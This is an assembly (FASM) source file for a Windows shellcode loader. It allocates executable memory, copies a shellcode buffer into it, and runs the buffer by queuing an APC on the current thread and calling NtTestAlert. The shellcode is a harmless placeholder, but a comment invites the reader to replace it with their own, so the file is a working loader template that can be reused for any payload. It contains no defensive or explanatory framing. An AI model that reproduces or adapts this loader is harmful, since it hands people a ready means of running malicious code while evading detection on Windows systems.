format PE GUI 4.0
entry main

include 'win32w.inc'

section '.code' readable executable

; **************************************************
; * Code
main:
        ; VirtualAlloc()
        xor eax, eax                                   ; NULL
        push PAGE_EXECUTE_READWRITE                    ; VirtualAlloc.flProtect
        push MEM_COMMIT or MEM_RESERVE                 ; VirtualAlloc.flAllocationType
        push [shellcode_length]                        ; VirtualAlloc.dwSize
        push eax                                       ; VirtualAlloc.lpAddress
        call [VirtualAlloc]
        test eax, eax
        jz exit

        ; Copy Shellcode to Allocated Memory Region
        mov edi, eax                                    ; Destination
        mov esi, shellcode                              ; Source
        mov ecx, [shellcode_length]                     ; Count
        rep movsb                                       ; Copy
        mov esi, eax                                    ; eax eq destination

        ; GetCurrentThread()
        call [GetCurrentThread]
        mov ebx, eax

        ; QueueUserAPC()
        xor eax, eax
        push eax                                        ; QueueUserAPC.dwData
        push ebx                                        ; QueueUserAPC.hThread (Current Thread)
        push esi                                        ; QueueUserAPC.pfnAPC (Copied Shellcode)
        call [QueueUserAPC]
        test eax, eax
        jz exit

        ; NtTestAlert()
        call [NtTestAlert]
exit:
        ; ExitProcess()
        xor eax, eax
        inc eax                                         ; ExitCode = 1
        push eax                                        ; ExitProcess.uExitCode
        call [ExitProcess]


; **************************************************
; * Data
section '.data' data readable

; Replace with your own shellcode
shellcode               db      0xcc, 0x90, 0x90, 0x90, 0x90

shellcode_length        dd      $ - shellcode

; **************************************************
; * Imports
section '.idata' import data readable

library kernel32, 'KERNEL32.dll',\
        ntdll, 'NTDLL.DLL'

import kernel32,\
       ExitProcess, 'ExitProcess',\
       GetCurrentThread, 'GetCurrentThread',\
       QueueUserAPC, 'QueueUserAPC',\
       VirtualAlloc, 'VirtualAlloc'

import ntdll,\
       NtTestAlert, 'NtTestAlert'
